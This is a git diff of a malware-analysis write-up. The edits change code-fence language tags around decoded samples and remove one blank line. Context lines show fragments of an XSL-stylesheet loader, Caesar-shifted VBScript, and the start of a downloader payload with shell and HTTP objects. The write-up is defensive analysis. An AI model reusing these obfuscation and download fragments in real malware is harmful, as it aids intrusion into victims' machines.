@@ -45,7 +45,7 @@ docObject.transformNode(docObject);
 
 At the end of the deobfuscated script, there's a peculiar blob of data that warrants closer inspection. I use the `URL Decode` function on CyberChef to pretty it
 
-```vbscript
+```xml
 <?xml version='1.0'?>
 <stylesheet
     xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
@@ -62,7 +62,7 @@ TpHCM = "":for i = 1 to 3222: TpHCM = TpHCM + chr(Asc(mid("Stxmsr$I|tpmgmxHmq$s
 
 The script uses a simple Caesar cipher (subtracting 4 from each character's ASCII value) to hide a VBScript payload. After decoding by adding 4 to each character, the payload reveals:
 
-```vbscript
+```vb
 Option Explicit
 Dim objShell, objFSO, objHTTP
 Dim strURL1, strURL2, strURL3, strShowfileURL
@@ -152,7 +152,6 @@ Sub DownloadFile(url, path)
     End If
     Set objStream = Nothing
 End Sub
-
 ```
 
 **What the malware does:**
